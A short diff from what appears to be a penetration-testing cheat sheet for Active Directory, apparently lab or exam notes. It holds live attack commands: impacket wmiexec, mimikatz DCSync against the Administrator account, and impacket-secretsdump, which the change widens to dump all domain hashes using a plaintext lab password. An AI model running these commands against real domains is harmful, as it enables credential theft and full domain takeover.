@@ -490,5 +490,5 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 lsadump::dcsync /user:Administrator
 lsadump::dcsync /user:corp\Administrator
-kali: impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
